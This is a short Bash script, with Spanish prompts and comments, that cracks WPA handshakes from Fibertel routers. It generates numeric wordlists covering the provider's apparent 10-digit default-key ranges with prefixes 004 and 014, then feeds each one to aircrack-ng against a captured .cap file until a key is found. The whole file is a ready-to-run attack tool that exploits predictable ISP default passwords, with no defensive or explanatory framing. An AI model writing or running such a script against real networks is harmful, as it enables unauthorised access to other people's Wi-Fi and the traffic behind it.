#!/bin/bash

echo "Ejecutar este script en screen, fibertel 10 digitos"
echo -n "ingrese ESSID="
read ESSID
echo -n "ingrese archivo .cap ejemplo 0XX-01="
read capFile
echo "benchmark......"
echo "0" > key
#aircrack-ng -S

#20millones a 30 millones, 10 digitos, 004
seq -w 0042000000 0043000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
#20millones a 30 millones, 10 digitos, 014
seq -w 0142000000 0143000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
#30millones a 44 millones, 10 digitos, 004
seq -w 0043000000 0044400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
sleep 10
#30millones a 44 millones, 10 digitos, 014
seq -w 0143000000 0144400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
sleep 10
#08millones a 20 millones, 10 digitos, 004
seq -w 0040800000 0042000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
sleep 10
#08millones a 20 millones, 10 digitos, 014
seq -w 0140800000 0142000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
if [ $(cat key) != "0" ]
  then
    exit 0
  fi
rm dic
